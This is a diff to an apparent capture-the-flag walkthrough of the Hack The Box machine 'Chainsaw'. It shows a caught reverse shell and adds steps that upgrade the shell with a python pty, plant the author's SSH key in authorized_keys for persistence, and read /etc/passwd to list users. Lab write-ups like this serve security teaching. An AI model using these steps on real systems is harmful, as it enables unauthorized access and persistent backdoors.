@@ -134,8 +134,25 @@ listening on [any] 4444 ...
 connect to [10.10.14.35] from (UNKNOWN) [10.10.10.142] 40676
 id
 uid=1001(administrator) gid=1001(administrator) groups=1001(administrator)
-```
-I quickly searched for the user.txt but it is not here, so back to further enumeration.
+python -c 'import pty; pty.spawn("/bin/bash")'
+administrator@chainsaw:/opt/WeaponizedPing$ 
 
+```
+Before doing anything i upgraded the shell to a fully tty. After that i quickly searched for the user.txt but it is not here, so back to further enumeration. 
+
+###### Enumeration:
+I dropped my SSH public key into the /home/administrator/.ssh/authorized_keys file so i can get into the system easily, without having to run the exploit again and again.
+
+Checked to see if their is anyother users in the system
+
+```python
+
+administrator@chainsaw:/home$ awk -F: '$3 >= 1000 {print}' /etc/passwd
+awk -F: '$3 >= 1000 {print}' /etc/passwd
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+bobby:x:1000:1000:Bobby Axelrod:/home/bobby:/bin/bash
+administrator:x:1001:1001:Chuck Rhoades,,,,IT Administrator:/home/administrator:/bin/bash
+administrator@chainsaw:/home$ 
+```
 
 
